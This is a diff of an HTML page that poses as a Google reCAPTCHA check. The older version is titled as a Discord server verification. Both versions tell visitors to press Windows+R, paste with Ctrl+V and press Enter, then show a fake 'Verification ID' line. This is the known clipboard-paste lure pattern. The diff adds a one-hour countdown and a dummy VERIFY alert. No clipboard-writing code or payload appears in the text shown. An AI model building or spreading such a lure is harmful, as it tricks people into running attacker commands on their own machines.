@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Verify To Get ACCESS To Discord Server</title>
+  <title>reCAPTCHA Verification</title>
   <style>
     body {
-      background: #f2f2f2;
+      background-color: #f9f9f9;
       font-family: Arial, sans-serif;
       display: flex;
       justify-content: center;
@@ -13,165 +13,157 @@
       height: 100vh;
     }
 
-    .captcha-box {
-      width: 304px;
-      height: 78px;
-      background: #fff;
-      border: 1px solid #d3d3d3;
+    .verification-container {
+      width: 350px;
+      border: 1px solid #ccc;
+      border-top: 6px solid #1a73e8;
       border-radius: 3px;
-      display: flex;
-      align-items: center;
-      padding: 10px;
-      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
-      position: relative;
-      cursor: pointer;
-    }
-
-    .checkbox {
-      width: 28px;
-      height: 28px;
-      border: 2px solid #ccc;
-      border-radius: 2px;
-      margin-right: 12px;
-      position: relative;
-    }
-
-    .checkbox.checked::after {
-      content: '';
-      position: absolute;
-      top: 3px;
-      left: 8px;
-      width: 8px;
-      height: 14px;
-      border: solid #000;
-      border-width: 0 3px 3px 0;
-      transform: rotate(45deg);
-    }
-
-    .captcha-text {
-      flex-grow: 1;
-      font-size: 16px;
-      color: #222;
-    }
-
-    .captcha-logo {
-      position: absolute;
-      right: 10px;
-      bottom: 8px;
-      display: flex;
-      align-items: center;
-      font-size: 10px;
-      color: #888;
-    }
-
-    .captcha-logo img {
-      width: 20px;
-      height: 20px;
-      margin-left: 6px;
-    }
-
-    /* Modal */
-    .modal {
-      position: fixed;
-      top: 0; left: 0;
-      width: 100vw; height: 100vh;
-      background: rgba(0, 0, 0, 0.6);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 999;
-    }
-
-    .modal-content {
-      background: #fff;
-      width: 360px;
+      background: white;
       padding: 20px;
-      border-radius: 6px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.2);
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
     }
 
-    .modal-content h2 {
-      color: #007bff;
+    .verification-title {
+      font-size: 20px;
+      color: #1a73e8;
+      font-weight: bold;
       margin-bottom: 10px;
     }
 
-    .modal-content ol {
+    .verification-subtitle {
+      font-size: 18px;
+      font-weight: bold;
+      color: #333;
+      margin-bottom: 15px;
+    }
+
+    ol {
       padding-left: 20px;
       margin-bottom: 15px;
     }
 
-    .modal-content ol li {
-      margin-bottom: 10px;
+    ol li {
+      font-size: 14px;
+      margin-bottom: 8px;
     }
 
-    .modal-content strong {
-      font-weight: bold;
+    .agree-text {
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 10px;
     }
 
     .green-check {
       color: green;
+      font-family: monospace;
       font-size: 12px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
     }
 
-    .verify-btn {
-      background: #007bff;
+    .verify-button {
+      margin-top: 15px;
+      width: 100%;
+      padding: 10px;
+      background: #1a73e8;
       color: white;
-      border: none;
-      padding: 8px 20px;
-      font-size: 14px;
-      border-radius: 4px;
-      cursor: pointer;
-      float: right;
-    }
-
-    .close-btn {
-      float: right;
-      font-size: 20px;
       font-weight: bold;
+      font-size: 14px;
+      border: none;
+      border-radius: 2px;
       cursor: pointer;
-      color: #aaa;
     }
 
-    .close-btn:hover {
-      color: #000;
+    .verify-button:disabled {
+      background: #cccccc;
+      cursor: not-allowed;
+    }
+
+    .recaptcha-box {
+      margin-top: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .recaptcha-box input[type="checkbox"] {
+      width: 20px;
+      height: 20px;
+    }
+
+    .countdown {
+      font-size: 12px;
+      color: #999;
+      margin-top: 5px;
     }
   </style>
 </head>
 <body>
 
-<div class="captcha-box" onclick="openModal()">
-  <div class="checkbox" id="checkbox"></div>
-  <div class="captcha-text">I'm not a robot</div>
-  <div class="captcha-logo">
-    reCAPTCHA
-    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-  </div>
-</div>
+<div class="verification-container">
+  <div class="verification-title">Complete these</div>
+  <div class="verification-subtitle">Verification Steps</div>
 
-<div class="modal" id="captchaModal">
-  <div class="modal-content">
-    <span class="close-btn" onclick="closeModal()">&times;</span>
-    <h2>Complete these <strong>Verification Steps</strong></h2>
-    <p>To better prove you are not a robot, please:</p>
-    <ol>
-      <li><strong>Press & hold</strong> the Windows Key <kbd>⊞</kbd> + <kbd>R</kbd></li>
-      <li>In the verification window, press <strong>Ctrl + V</strong></li>
-      <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
-    </ol>
-    <p class="green-check">✅ "I am not a robot - reCAPTCHA Verification ID: 8883"</p>
-    <button class="verify-btn" onclick="closeModal()">VERIFY</button>
+  <p style="font-size: 14px; margin-bottom: 10px;">
+    To better prove you are not a robot, please:
+  </p>
+
+  <ol>
+    <li>Press & hold the Windows key <strong>(⊞)</strong> + <strong>R</strong>.</li>
+    <li>In the verification window, press <strong>Ctrl + V</strong>.</li>
+    <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
+  </ol>
+
+  <div class="agree-text">
+    You will observe and agree:
   </div>
+  <div class="green-check">
+    ✅ “I am not a robot – reCAPTCHA Verification ID: 8883”
+  </div>
+
+  <div class="recaptcha-box">
+    <input type="checkbox" id="robotCheck" />
+    <label for="robotCheck">I'm not a robot</label>
+  </div>
+
+  <div class="countdown" id="countdown"></div>
+
+  <button class="verify-button" id="verifyBtn" onclick="alert('Verified!')" disabled>
+    VERIFY
+  </button>
 </div>
 
 <script>
-  function openModal() {
-    document.getElementById('captchaModal').style.display = 'flex';
-    document.getElementById('checkbox').classList.add('checked');
-  }
+  const checkbox = document.getElementById('robotCheck');
+  const verifyBtn = document.getElementById('verifyBtn');
+  const countdownEl = document.getElementById('countdown');
 
-  function closeModal() {
-    document.getElementById('captchaModal').style.display = 'none';
-  }
+  checkbox.addEventListener('change', () => {
+    if (checkbox.checked) {
+      const oneHour = 3600000;
+      const endTime = Date.now() + oneHour;
+
+      verifyBtn.disabled = true;
+
+      const interval = setInterval(() => {
+        const remaining = endTime - Date.now();
+
+        if (remaining <= 0) {
+          clearInterval(interval);
+          verifyBtn.disabled = false;
+          countdownEl.textContent = '';
+        } else {
+          const minutes = Math.floor(remaining / 60000);
+          const seconds = Math.floor((remaining % 60000) / 1000);
+          countdownEl.textContent = `Please wait ${minutes}m ${seconds}s before verifying.`;
+        }
+      }, 1000);
+    } else {
+      verifyBtn.disabled = true;
+      countdownEl.textContent = '';
+    }
+  });
 </script>
 
 </body>
